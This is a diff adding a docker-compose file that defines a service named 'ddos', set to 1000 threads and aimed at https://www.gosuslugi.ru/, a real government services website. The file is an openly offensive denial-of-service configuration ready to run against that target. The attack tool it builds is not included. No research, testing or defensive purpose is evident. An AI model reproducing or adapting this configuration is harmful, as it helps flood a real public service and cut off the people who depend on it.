@@ -1,0 +1,9 @@
+version: '3.7'
+
+services:
+  ddos:
+    build:
+      context: .
+    environment:
+      THREADS: "1000"
+      URIES: "https://www.gosuslugi.ru/"      
